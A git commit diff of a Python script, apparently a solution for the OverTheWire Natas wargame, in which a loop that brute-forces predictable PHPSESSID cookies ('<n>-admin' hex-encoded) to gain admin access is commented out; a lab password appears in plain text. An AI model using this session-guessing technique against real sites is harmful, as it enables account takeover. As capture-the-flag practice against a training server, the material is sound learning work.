2d2562094f5e4a3a17f423c9a46e2e991cac88e3
TimDOtt <tott23@gmail.com>
2020-04-18 00:36:41 -0500

    removed unnecessary code

--- sessionid_brute.py
+++ sessionid_brute.py
@@ -2,6 +2,7 @@
 
 import requests
 import binascii
+import phpserialize
 
 
 # url = 'http://natas18.natas.labs.overthewire.org/'
@@ -24,35 +25,35 @@ import binascii
 #         print(r.text)
 #         break
 
-    ###############################################################################################
+###############################################################################################
                                     #Natas 19
 ###############################################################################################
 
-url = 'http://natas19.natas.labs.overthewire.org/'
-username = 'natas19'
-password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
-data = {
-    'username': 'admin',
-    'password': '',
-}
+# url = 'http://natas19.natas.labs.overthewire.org/'
+# username = 'natas19'
+# password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+# data = {
+#     'username': 'admin',
+#     'password': '',
+# }
 
-### Used the while loop below to determine what the session ID cookies pattern and length was
+# ### Used the while loop below to determine what the session ID cookies pattern and length was
 
-# while True:
-#     r = requests.post(url, auth=(username, password), data=data)
-#     for c in r.cookies:
-#         a = str(c.value)
-#         print(a)
+# # while True:
+# #     r = requests.post(url, auth=(username, password), data=data)
+# #     for c in r.cookies:
+# #         a = str(c.value)
+# #         print(a)
 
 
-for i in range(641):
-    f = (str(i) + '-admin').encode()
-    g = binascii.hexlify(f).decode()
-    cookie = dict(PHPSESSID=g)
-    r = requests.get(url, auth=(username, password), cookies=cookie)
-    print(cookie, end='\r')
-    if 'You are an admin' in r.text:
-        cookie=cookie
-        print(f'Success!! The admin cookie is {cookie}')
-        print(r.text)
-        break
+# for i in range(641):
+#     f = (str(i) + '-admin').encode()
+#     g = binascii.hexlify(f).decode()
+#     cookie = dict(PHPSESSID=g)
+#     r = requests.get(url, auth=(username, password), cookies=cookie)
+#     print(cookie, end='\r')
+#     if 'You are an admin' in r.text:
+#         cookie=cookie
+#         print(f'Success!! The admin cookie is {cookie}')
+#         print(r.text)
+#         break
